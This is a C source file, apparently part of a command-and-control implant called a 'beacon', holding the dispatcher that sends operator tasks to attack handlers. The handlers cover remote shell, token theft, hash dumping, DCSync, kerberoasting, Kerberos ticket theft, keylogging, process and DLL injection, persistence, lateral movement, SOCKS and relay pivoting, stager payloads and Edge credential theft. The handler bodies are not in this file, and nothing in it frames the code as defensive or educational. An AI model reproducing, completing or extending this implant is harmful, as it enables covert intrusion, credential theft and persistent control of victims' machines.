// Command dispatcher — routes BeaconTask.op to the appropriate handler.

#include "beacon.h"

// Forward declarations from command modules.
void cmd_shell(const BeaconTask* t);
void cmd_run(const BeaconTask* t);
void cmd_ishell(const BeaconTask* t);
void cmd_token_steal(const BeaconTask* t);
void cmd_token_make(const BeaconTask* t);
void cmd_token_rev(const BeaconTask* t);
void cmd_token_getuid(const BeaconTask* t);
void cmd_priv_all(const BeaconTask* t);
void cmd_tcp_pivot(const BeaconTask* t);
void cmd_ps(const BeaconTask* t);
void cmd_ls(const BeaconTask* t);
void cmd_cd(const BeaconTask* t);
void cmd_pwd(const BeaconTask* t);
void cmd_rm(const BeaconTask* t);
void cmd_cp(const BeaconTask* t);
void cmd_mv(const BeaconTask* t);
void cmd_upload(const BeaconTask* t);
void cmd_download(const BeaconTask* t);
void cmd_sleep(const BeaconTask* t);
void cmd_exit(const BeaconTask* t);
void cmd_kill(const BeaconTask* t);
void cmd_bof(const BeaconTask* t);
void cmd_inject_thread(const BeaconTask* t);
void cmd_inject_apc(const BeaconTask* t);
void cmd_spawnto(const BeaconTask* t);
void cmd_modstomp(const BeaconTask* t);
void cmd_execute_assembly(const BeaconTask* t);
void cmd_hashdump(const BeaconTask* t);
void cmd_ticket_list(const BeaconTask* t);
void cmd_ticket_dump(const BeaconTask* t);
void cmd_ticket_use(const BeaconTask* t);
void cmd_ticket_purge(const BeaconTask* t);
void cmd_privesc_admin(const BeaconTask* t);
void cmd_privesc_system(const BeaconTask* t);
void cmd_privesc_plasma(const BeaconTask* t);
void cmd_migrate(const BeaconTask* t);
void cmd_inject_dll(const BeaconTask* t);
void cmd_ldap_addda(const BeaconTask* t);
void cmd_ldap_rbcd(const BeaconTask* t);
void cmd_dcsync(const BeaconTask* t);
void cmd_kerberoast(const BeaconTask* t);
void cmd_screenshot(const BeaconTask* t);
void cmd_portscan(const BeaconTask* t);
void cmd_keylogger(const BeaconTask* t);
void cmd_persist_reg(const BeaconTask* t);
void cmd_persist_task(const BeaconTask* t);
void cmd_persist_wmi(const BeaconTask* t);
void cmd_rportfwd_open(const BeaconTask* t);
void cmd_rportfwd_data(const BeaconTask* t);
void cmd_rportfwd_close(const BeaconTask* t);
void rportfwd_flush_pending(const TransportVtbl* tv);
void cmd_psexec_cmd(const BeaconTask* t);
void cmd_wmiexec(const BeaconTask* t);
void cmd_dcomexec(const BeaconTask* t);
void cmd_winrmexec(const BeaconTask* t);
void cmd_portfwd(const BeaconTask* t);
void cmd_socks_open(const BeaconTask* t);
void cmd_socks_data(const BeaconTask* t);
void cmd_socks_close(const BeaconTask* t);
void cmd_relay_start(const BeaconTask* t);
void cmd_relay_stop(const BeaconTask* t);
void cmd_relay_resp(const BeaconTask* t);
void cmd_stager_lnk(const BeaconTask* t);
void cmd_stager_hta(const BeaconTask* t);
void cmd_stager_vbs(const BeaconTask* t);
void cmd_stager_wsf(const BeaconTask* t);
void cmd_stager_iso(const BeaconTask* t);
void cmd_stager_chm(const BeaconTask* t);
void cmd_adcs_enum(const BeaconTask* t);
void cmd_edge_creds(const BeaconTask* t);

// Format a decimal integer without CRT into out (returns chars written).
static int fmt_u64(char* out, uint64_t v) {
    char tmp[24]; int n = 0;
    if (!v) { out[0] = '0'; out[1] = 0; return 1; }
    while (v) { tmp[n++] = (char)('0' + v % 10); v /= 10; }
    int i = 0;
    while (n) out[i++] = tmp[--n];
    out[i] = 0;
    return i;
}

static void log_task(const char* stage, const BeaconTask* t) {
    char buf[160];
    int i = 0;
    const char p1[] = "[beacon] task ";
    for (size_t j = 0; j < sizeof(p1) - 1; ++j) buf[i++] = p1[j];
    for (size_t j = 0; stage[j]; ++j) buf[i++] = stage[j];
    const char p2[] = ": id=";
    for (size_t j = 0; j < sizeof(p2) - 1; ++j) buf[i++] = p2[j];
    i += fmt_u64(buf + i, t->id);
    const char p3[] = " op=";
    for (size_t j = 0; j < sizeof(p3) - 1; ++j) buf[i++] = p3[j];
    i += fmt_u64(buf + i, t->op);
    const char p4[] = " paylen=";
    for (size_t j = 0; j < sizeof(p4) - 1; ++j) buf[i++] = p4[j];
    i += fmt_u64(buf + i, t->pay_len);
    buf[i++] = '\n'; buf[i] = 0;
    bdbg(buf);
}

static void log_payload_preview(const BeaconTask* t) {
    if (!t->pay || !t->pay_len) return;
    char buf[160];
    int i = 0;
    const char p[] = "[beacon] task payload (first 64b ascii): \"";
    for (size_t j = 0; j < sizeof(p) - 1; ++j) buf[i++] = p[j];
    uint32_t n = t->pay_len < 64 ? t->pay_len : 64;
    for (uint32_t k = 0; k < n && i < (int)sizeof(buf) - 4; ++k) {
        uint8_t b = t->pay[k];
        buf[i++] = (b >= 0x20 && b < 0x7F) ? (char)b : '.';
    }
    buf[i++] = '"'; buf[i++] = '\n'; buf[i] = 0;
    bdbg(buf);
}

void cmd_dispatch(const BeaconTask* t) {
    //log_task("received", t);
    //log_payload_preview(t);

    out_begin(t->id, RESP_OUTPUT);
    switch (t->op) {
        case OP_SHELL:    cmd_shell(t);    break;
        case OP_RUN:      cmd_run(t);      break;
        case OP_PS:       cmd_ps(t);       break;
        case OP_LS:       cmd_ls(t);       break;
        case OP_CD:       cmd_cd(t);       break;
        case OP_PWD:      cmd_pwd(t);      break;
        case OP_RM:       cmd_rm(t);       break;
        case OP_CP:       cmd_cp(t);       break;
        case OP_MV:       cmd_mv(t);       break;
        case OP_UPLOAD:   cmd_upload(t);   break;
        case OP_DOWNLOAD: out_begin(t->id, RESP_FILE); cmd_download(t); break;
        case OP_SLEEP:    cmd_sleep(t);    break;
        case OP_EXIT:     cmd_exit(t);     break;
        case OP_KILL:     cmd_kill(t);     break;
        case OP_BOF:      cmd_bof(t);      break;
        case OP_ISHELL:      cmd_ishell(t);       break;
        case OP_TOKEN_STEAL: cmd_token_steal(t);  break;
        case OP_TOKEN_MAKE:  cmd_token_make(t);   break;
        case OP_TOKEN_REV:   cmd_token_rev(t);    break;
        case OP_TOKEN_GETUID:   cmd_token_getuid(t);   break;
        case OP_PRIV_ALL:       cmd_priv_all(t);       break;
        case OP_TCP_PIVOT:      cmd_tcp_pivot(t);      break;
        case OP_INJECT_THREAD:  cmd_inject_thread(t);  break;
        case OP_INJECT_APC:     cmd_inject_apc(t);     break;
        case OP_SPAWNTO:        cmd_spawnto(t);        break;
        case OP_MODSTOMP:       cmd_modstomp(t);       break;
        case OP_EXEASM:         cmd_execute_assembly(t); break;
        case OP_HASHDUMP:       cmd_hashdump(t);      break;
        case OP_TICKET_LIST:    cmd_ticket_list(t);   break;
        case OP_TICKET_DUMP:    cmd_ticket_dump(t);   break;
        case OP_TICKET_USE:     cmd_ticket_use(t);    break;
        case OP_TICKET_PURGE:   cmd_ticket_purge(t);  break;
        case OP_PRIVESC_ADMIN:  cmd_privesc_admin(t); break;
        case OP_PRIVESC_SYSTEM: cmd_privesc_system(t); break;
        case OP_PRIVESC_PLASMA: cmd_privesc_plasma(t); break;
        case OP_MIGRATE:        cmd_migrate(t);        break;
        case OP_INJECT_DLL:     cmd_inject_dll(t);     break;
        case OP_LDAP_ADDDA:     cmd_ldap_addda(t);     break;
        case OP_LDAP_RBCD:      cmd_ldap_rbcd(t);      break;
        case OP_DCSYNC:         cmd_dcsync(t);         break;
        case OP_KERBEROAST:     cmd_kerberoast(t);     break;
        // Screenshot передаётся как RESP_FILE — переопределяем тип до вызова.
        case OP_SCREENSHOT:    out_begin(t->id, RESP_FILE); cmd_screenshot(t); break;
        case OP_PERSIST_REG:   cmd_persist_reg(t);   break;
        case OP_PERSIST_TASK:  cmd_persist_task(t);  break;
        case OP_PERSIST_WMI:   cmd_persist_wmi(t);   break;
        case OP_PORTSCAN:      cmd_portscan(t);      break;
        case OP_KEYLOGGER:     cmd_keylogger(t);     break;
        case OP_RPORTFWD_OPEN:  cmd_rportfwd_open(t);  out_mark_done(); break;
        case OP_RPORTFWD_DATA:  cmd_rportfwd_data(t);  out_mark_done(); break;
        case OP_RPORTFWD_CLOSE: cmd_rportfwd_close(t); out_mark_done(); break;
        case OP_PSEXEC_CMD:  cmd_psexec_cmd(t);  break;
        case OP_WMIEXEC:     cmd_wmiexec(t);     break;
        case OP_DCOMEXEC:    cmd_dcomexec(t);    break;
        case OP_WINRMEXEC:   cmd_winrmexec(t);   break;
        case OP_PORTFWD:     cmd_portfwd(t);     break;
        // SOCKS и relay используют transport_direct_send напрямую.
        // out_mark_done() подавляет пустой кадр подтверждения.
        case OP_SOCKS_OPEN:  cmd_socks_open(t);  out_mark_done(); break;
        case OP_SOCKS_DATA:  cmd_socks_data(t);  out_mark_done(); break;
        case OP_SOCKS_CLOSE: cmd_socks_close(t); out_mark_done(); break;
        case OP_RELAY_START:  cmd_relay_start(t); break;
        case OP_RELAY_STOP:   cmd_relay_stop(t);  break;
        case OP_RELAY_RESP:   cmd_relay_resp(t);  out_mark_done(); break;
        case OP_STAGER_LNK:   cmd_stager_lnk(t); break;
        case OP_STAGER_HTA:   cmd_stager_hta(t); break;
        case OP_STAGER_VBS:   cmd_stager_vbs(t); break;
        case OP_STAGER_WSF:   cmd_stager_wsf(t); break;
        case OP_STAGER_ISO:   cmd_stager_iso(t); break;
        case OP_STAGER_CHM:   cmd_stager_chm(t); break;
        case OP_ADCS_ENUM:    cmd_adcs_enum(t);    break;
        case OP_EDGE_CREDS:   cmd_edge_creds(t);   break;
        default: {
            const char msg[] = "unknown op\n";
            out_begin(t->id, RESP_ERROR);
            out_write(msg, sizeof(msg)-1);
        }
    }
    //log_task("done", t);
}
